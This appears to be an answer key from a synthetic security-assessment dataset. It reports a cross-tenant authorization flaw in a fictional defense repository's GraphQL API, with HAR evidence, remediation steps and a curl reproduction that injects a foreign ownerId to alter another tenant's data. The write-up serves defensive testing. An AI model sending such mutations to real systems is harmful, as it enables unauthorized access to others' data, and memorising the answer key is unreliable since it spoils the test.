# Expected Response

## System
- Domain: Defense Industrial Base
- System: Aegis Vault Secure Repository
- Example ID: GQL-0156

## Priority Findings

### Finding 1: Defense Repository — Related Resource BOLA Exposes Cross-Tenant Classified Data (Pattern 1.2)
**Severity:** Critical
**Category:** BOLA / Related or Linked Resources

**Summary:**
Per §5.0 (Pattern 1.2 — related or linked resources): The `updateResource` resolver fetches linked resources without enforcing tenancy. An attacker from `tenant-2e5c` submitted `updateResource(id: "R-2156", input: {status: "approved", ownerId: "attacker-2e5cbaf8"})` against a defense repository resource belonging to `tenant-baf8`, gaining cross-tenant access to `CONFIDENTIAL-2e5cbaf8`. In Defense Industrial Base, this compromises classified linked resource chains with national security implications.

**Evidence from HAR:**
- Request: `POST https://api.aegis-vault-secure-r.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-2e5c`
- Mutation: `updateResource(id: "R-2156", input: {status: "approved", ownerId: "attacker-2e5cbaf8"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-baf8"`, `ownerId: "other-user-2e5cbaf8"`, `sensitiveField: "CONFIDENTIAL-2e5cbaf8"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-2e5cbaf8`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 1.2 | Related linked resource, no tenancy |
| HAR request | input.ownerId | attacker-2e5cbaf8 (client-injected) |
| HAR response | tenantId | Cross-tenant defense data tenant-baf8 |
| HAR response | sensitiveField | CONFIDENTIAL-2e5cbaf8 |

## Steps to Reproduce

### Step 1 — updateResource related resource BOLA (HAR)
```bash
curl -s -X POST https://api.aegis-vault-secure-r.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-2e5c" \
  -d '{"query": "mutation { updateResource(id: \"R-2156\", input: {status: \"approved\", ownerId: \"attacker-2e5cbaf8\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-baf8` defense data mutated. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId` for all linked resources.
2. Strip `ownerId` from `ResourceInput`.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
